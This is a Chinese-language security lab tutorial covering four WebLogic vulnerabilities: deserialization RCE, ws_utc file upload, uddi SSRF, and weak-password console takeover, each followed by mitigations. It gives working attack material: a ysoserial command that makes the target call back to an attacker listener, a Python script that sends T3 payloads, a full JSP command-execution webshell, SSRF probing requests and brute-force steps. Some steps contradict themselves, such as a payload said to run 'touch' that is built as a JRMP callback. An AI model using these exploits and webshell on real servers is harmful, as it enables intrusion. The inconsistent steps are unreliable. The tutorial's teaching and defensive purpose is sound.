#  WebLogic 

## WebLogic 概述

WebLogic 是 Oracle 公司推出的 Java EE 应用服务器，广泛用于企业级系统（如金融、政务、电商）的后台部署。因其功能复杂、组件繁多，历史上多次曝出高危漏洞，成为攻击者重点攻击目标。本章节聚焦 4 类典型漏洞，覆盖**反序列化**、**文件上传**、**SSRF**及**弱口令攻击**，通过实验掌握漏洞原理与防御逻辑。



***

## 1. WebLogic 反序列化漏洞（以 CVE-2018-2628 为例）

### 1.1 漏洞原理

#### 核心概念：序列化与反序列化



* **序列化**：将 Java 对象转化为字节流（便于存储 / 传输）的过程；

* **反序列化**：将字节流恢复为 Java 对象的过程。

#### 漏洞根源

WebLogic 的 WLS 组件（WebLogic Server）在处理 T3 协议（WebLogic 私有远程调用协议）请求时，未对反序列化的对象进行安全校验。攻击者可构造**恶意序列化字节流**，通过 T3 协议发送至目标服务器，服务器在反序列化过程中会执行字节流中隐藏的恶意代码，实现远程命令执行（RCE）。

#### 影响范围



* 受影响版本：WebLogic 10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3

* 危害等级：**高危（CVSS 评分 9.8）**

### 1.2 实验环境搭建

#### 环境清单



| 工具 / 系统  | 版本要求                   | 用途              | 下载地址及说明                                                                                                                                                                                                                                            |
| -------- | ---------------------- | --------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 虚拟机      | VMware Workstation 16+ | 运行漏洞环境          | 官网：[https://www.vmware.com/cn/products/workstation-pro.html](https://www.vmware.com/cn/products/workstation-pro.html)                                                                                                                              |
| 操作系统     | CentOS 7 64 位          | 部署 WebLogic     | 官网：[https://www.centos.org/download/](https://www.centos.org/download/)                                                                                                                                                                            |
| WebLogic | 10.3.6.0               | 漏洞靶场            | Oracle 软件交付云：[http://edelivery.oracle.com](http://edelivery.oracle.com) ，需搜索 "WebLogic Server 10.3.6.0" 并登录下载                                                                                                                                      |
| JDK      | 1.7（7u80）64 位          | 运行 WebLogic 依赖  | Oracle 归档页面：[https://www.oracle.com/cn/java/technologies/javase/javase7-archive-downloads.html](https://www.oracle.com/cn/java/technologies/javase/javase7-archive-downloads.html) ，需注册 Oracle 账号，选择 "Java SE Development Kit 7u80" 的 Linux 64 位版本 |
| 攻击机      | Windows 10             | 执行漏洞利用工具        | 微软官网：[https://www.microsoft.com/zh-cn/software-download/windows10](https://www.microsoft.com/zh-cn/software-download/windows10)                                                                                                                    |
| 漏洞利用工具   | ysoserial.jar（v0.0.2）  | 生成恶意序列化 payload | GitHub Releases：[https://github.com/frohoff/ysoserial/releases/download/v0.0.2/ysoserial-0.0.2-all.jar](https://github.com/frohoff/ysoserial/releases/download/v0.0.2/ysoserial-0.0.2-all.jar) ，可直接下载 jar 包或通过源码编译                                 |

#### 搭建步骤



1. **安装 JDK**



```
\# 上传jdk-7u80-linux-x64.tar.gz至/opt目录

tar -zxvf jdk-7u80-linux-x64.tar.gz

\# 配置环境变量

echo "export JAVA\_HOME=/opt/jdk1.7.0\_80" >> /etc/profile

echo "export PATH=\$JAVA\_HOME/bin:\$PATH" >> /etc/profile

source /etc/profile

\# 验证安装：java -version 显示1.7.0\_80即成功
```



1. **安装 WebLogic&#x20;****10.3.6.0**



```
\# 上传wls1036\_generic.jar至/opt目录

java -jar wls1036\_generic.jar

\# 按向导安装：选择"典型安装"，设置管理员账号密码（如weblogic/weblogic123）
```



1. **启动 WebLogic 并验证**



```
\# 进入域目录（安装时指定，默认如/user\_projects/domains/base\_domain）

cd /user\_projects/domains/base\_domain/bin

./startWebLogic.sh

\# 浏览器访问http://虚拟机IP:7001/console，出现登录页即环境就绪
```

### 1.3 漏洞实操：远程命令执行

#### 步骤 1：准备恶意 Payload

使用`ysoserial.jar`生成基于 T3 协议的反序列化 Payload（以执行`touch /tmp/weblogic_vul`命令为例）：



```
\# 攻击机执行（需安装JDK）

java -jar ysoserial.jar JRMPClient2 "攻击机IP:4444" > payload.ser

\# 说明：JRMPClient2是适配WebLogic的gadget，4444为攻击机监听端口
```

#### 步骤 2：攻击机监听端口



```
\# Linux攻击机使用nc监听，Windows可使用nc或Burp Suite监听

nc -lvp 4444
```

#### 步骤 3：发送 Payload 至目标

使用 Python 脚本通过 T3 协议发送 Payload：



```
\# 脚本名：weblogic\_deserialization.py

import socket

import sys

def send\_payload(target\_ip, port, payload\_path):

&#x20;   # 读取Payload文件

&#x20;   with open(payload\_path, 'rb') as f:

&#x20;       payload = f.read()

&#x20;   # 构造T3协议头（简化版）

&#x20;   t3\_header = b't3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'

&#x20;   # 建立Socket连接

&#x20;   sock = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)

&#x20;   sock.connect((target\_ip, port))

&#x20;   sock.sendall(t3\_header)

&#x20;   # 接收服务器响应

&#x20;   response = sock.recv(1024)

&#x20;   print(f"服务器响应：{response.decode()}")

&#x20;   # 发送Payload

&#x20;   sock.sendall(payload)

&#x20;   sock.close()

if \_\_name\_\_ == "\_\_main\_\_":

&#x20;   target\_ip = sys.argv\[1]  # 目标WebLogic IP

&#x20;   port = int(sys.argv\[2])   # 默认为7001

&#x20;   payload\_path = sys.argv\[3]# payload.ser路径

&#x20;   send\_payload(target\_ip, port, payload\_path)
```

执行脚本发送 Payload：



```
python weblogic\_deserialization.py 目标IP 7001 payload.ser
```

#### 步骤 4：验证漏洞利用结果

登录目标 WebLogic 服务器，查看`/tmp`目录是否存在`weblogic_vul`文件：



```
ls /tmp/weblogic\_vul  # 存在即证明命令执行成功
```

### 1.4 漏洞防范



1. **禁用 T3 协议**：在 WebLogic 控制台→“域→安全→筛选器” 中添加`weblogic.security.net``.ConnectionFilterImpl`，配置过滤规则`127.0.0.1``  * * allow;  ``0.0.0.0/0`` * * deny`；

2. **安装官方补丁**：下载 Oracle 2018 年 4 月 CPU 补丁（补丁号 27155501）并安装；

3. **限制端口访问**：通过防火墙禁止公网访问 7001 端口，仅允许内网管理。



***

## 2. WebLogic 任意文件上传漏洞（CVE-2018-2894）

### 2.1 漏洞原理

WebLogic 的 Web 服务测试页面（`ws_utc`组件）存在文件上传功能，该组件在处理文件上传时，未对上传文件的**路径和类型**进行严格校验。攻击者可通过构造特殊请求，将恶意 JSP 文件上传至服务器的 Web 根目录，直接访问即可执行代码，实现 getshell。

#### 影响范围



* 受影响版本：WebLogic 10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3

* 触发条件：`ws_utc`组件未删除（默认存在于 WebLogic 安装目录）

### 2.2 实验环境搭建

复用 1.2 节的 WebLogic 10.3.6.0 环境，额外准备：



* 恶意 JSP 后门（如`shell.jsp`，内容为命令执行脚本）；

* 浏览器（Chrome/Firefox）及 Burp Suite。

### 2.3 漏洞实操：上传后门 getshell

#### 步骤 1：访问 ws\_utc 组件

浏览器访问`http://目标IP:7001/ws_utc/login.jsf`，使用管理员账号（weblogic/weblogic123）登录。

#### 步骤 2：配置文件上传路径



1. 登录后点击 “Preferences”→“Workspace”；

2. 将 “Working Directory” 修改为 WebLogic 的 Web 根目录：`/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/``com.oracle.webservices.wls.ws``-testclient-app-wls/4mcj4y/war/css`；

3. 点击 “Save” 保存配置（路径需根据实际安装目录调整）。

#### 步骤 3：上传恶意 JSP 后门



1. 点击 “Upload” 进入上传页面，选择本地准备的`shell.jsp`（内容如下）；



```
<%@ page import="java.io.\*" %>

<%

String cmd = request.getParameter("cmd");

Process p = Runtime.getRuntime().exec(cmd);

BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));

String line;

while((line=br.readLine())!=null){

&#x20;   out.println(line);

}

%>
```



1. 点击 “Submit” 上传，记录页面返回的文件 ID（如`16988xxx`）。

#### 步骤 4：访问后门执行命令

恶意文件的访问路径为：`http://目标IP:7001/ws_utc/css/文件ID_shell.jsp?cmd=命令`

示例：执行`whoami`命令

访问`http://192.168.1.100:7001/ws_utc/css/16988xxx_shell.jsp?cmd=whoami`，页面返回服务器当前用户（如`weblogic`），证明 getshell 成功。

### 2.4 漏洞防范



1. **删除 ws\_utc 组件**：直接删除 WebLogic 安装目录下的`ws_utc`文件夹；

2. **限制组件访问权限**：通过 WebLogic 控制台为`ws_utc`组件配置强访问控制，仅允许管理员 IP 访问；

3. **升级 WebLogic 版本**：更新至 12.2.1.4 及以上版本，Oracle 已修复该漏洞。



***

## 3. WebLogic SSRF 漏洞（CVE-2014-4210）

### 3.1 漏洞原理

SSRF（Server-Side Request Forgery，服务器端请求伪造）指攻击者诱导服务器向指定目标发送请求。WebLogic 的`uddi`组件（默认启用）在处理`SearchForm.jsp`页面的`operator`参数时，未对参数值进行校验，攻击者可通过构造`operator`参数，让 WebLogic 服务器向内网或其他目标发送 HTTP 请求，实现信息探测或攻击内网服务。

#### 危害场景



* 探测内网存活主机与开放端口；

* 访问内网敏感服务（如数据库、Redis）；

* 利用内网其他漏洞（如未授权访问）。

### 3.2 实验环境搭建

复用 WebLogic 10.3.6.0 环境，额外准备：



* 内网测试靶机（如开启 80、3306 端口的 MySQL 服务器）；

* Burp Suite（用于构造请求）。

### 3.3 漏洞实操：内网探测

#### 步骤 1：访问漏洞页面

浏览器访问`http://目标IP:7001/uddiexplorer/SearchForm.jsp`，确认页面正常显示（默认无需登录）。

#### 步骤 2：构造 SSRF 请求

使用 Burp Suite 拦截页面提交的请求，修改`operator`参数为内网探测目标：



1. **探测内网存活主机**

   构造请求（以探测内网 192.168.1.101 是否存活为例）：



```
POST /uddiexplorer/Search.jsp HTTP/1.1

Host: 目标IP:7001

Content-Type: application/x-www-form-urlencoded

operator=http://192.168.1.101\&rdoSearch=name\&txtSearchname=\&txtSearchkey=\&txtSearchfor=\&selfor=Business+location\&btnSubmit=Search
```



* 若响应时间短（<1s）且无 “Could not connect” 错误，证明主机存活；

* 若响应时间长或提示连接失败，证明主机未存活或端口未开放。

1. **探测内网端口**

   修改`operator`参数为`http://192.168.1.101:3306`（探测 MySQL 端口）：

* 若响应提示 “Connection refused”，证明端口未开放；

* 若响应显示数据库相关错误（如 “MySQL server version for the right syntax”），证明端口开放。

### 3.4 漏洞防范



1. **禁用 uddi 组件**：删除 WebLogic 安装目录下的`uddiexplorer`文件夹；

2. **过滤危险协议与 IP**：在 WebLogic 配置中添加请求过滤，禁止`operator`参数包含`http://`、`https://`等协议，或内网 IP 段（如 192.168.0.0/16）；

3. **升级补丁**：安装 Oracle 2014 年 7 月发布的安全补丁（补丁号 18031647）。



***

## 4. WebLogic 弱口令 && 后台 getshell

### 4.1 漏洞原理

WebLogic 管理控制台（默认端口 7001）是配置服务器的核心入口，若管理员使用**弱口令**（如 weblogic/weblogic、admin/123456），攻击者可暴力破解登录后台。登录后可通过 “部署应用” 功能上传恶意 WAR 包，实现 getshell，是企业内网渗透的常见路径。

### 4.2 实验环境搭建

复用 WebLogic 10.3.6.0 环境，额外准备：



* 弱口令字典（如`weblogic_password.txt`）；

* 恶意 WAR 包（`shell.war`，内含 JSP 后门）；

* 暴力破解工具（Burp Suite Intruder）。

### 4.3 漏洞实操：从弱口令到 getshell

#### 步骤 1：弱口令暴力破解



1. **抓包准备**：浏览器访问`http://目标IP:7001/console`，输入任意账号密码点击登录，用 Burp Suite 拦截请求；

2. **配置 Intruder**：

* 清除默认变量，仅将密码字段（如`j_password=xxx`）标记为变量；

* 加载弱口令字典（`weblogic_password.txt`）；

1. **开始破解**：执行攻击，根据响应长度识别成功登录的密码（成功登录的响应长度与失败不同）。

#### 步骤 2：后台部署恶意 WAR 包



1. **登录管理控制台**：使用破解得到的账号密码（如 weblogic/weblogic123）登录；

2. **部署应用**：

* 点击左侧 “部署”→“安装”，选择本地的`shell.war`包；

* 按向导完成部署：选择 “将此部署安装为应用程序”，目标服务器选择 “AdminServer”；

* 部署完成后启动应用（状态显示 “活动”）。

#### 步骤 3：访问后门 getshell

恶意 WAR 包部署后，默认访问路径为`http://目标IP:7001/应用名/后门文件名`

示例：`http://192.168.1.100:7001/shell/shell.jsp?cmd=ls`，页面返回服务器目录文件，证明 getshell 成功。

### 4.4 漏洞防范



1. **强制复杂密码**：在 WebLogic 控制台设置密码策略（长度≥12 位，包含大小写字母、数字、特殊符号）；

2. **限制登录 IP**：通过防火墙或 WebLogic 配置，仅允许指定 IP 段访问管理控制台；

3. **启用登录保护**：开启失败次数锁定（如连续 5 次失败锁定 30 分钟）；

4. **定期更换密码**：每 90 天更新一次管理员密码，并禁用默认账号。



***

## 总结



| 漏洞类型              | 核心危害          | 防御核心措施                 |
| ----------------- | ------------- | ---------------------- |
| 反序列化漏洞            | 远程命令执行        | 禁用 T3 协议 + 安装补丁        |
| 任意文件上传            | 上传后门 getshell | 删除 ws\_utc 组件 + 限制上传路径 |
| SSRF 漏洞           | 内网探测 + 横向攻击   | 禁用 uddi 组件 + 过滤危险请求    |
| 弱口令 + 后台 getshell | 权限窃取 + 服务器控制  | 强密码策略 + IP 限制 + 登录保护   |

**安全意识提醒**：WebLogic 漏洞多源于 “配置不当” 与 “未及时补丁”，企业需建立 “定期扫描 - 补丁更新 - 配置审计” 的安全闭环，从源头降低漏洞风险。

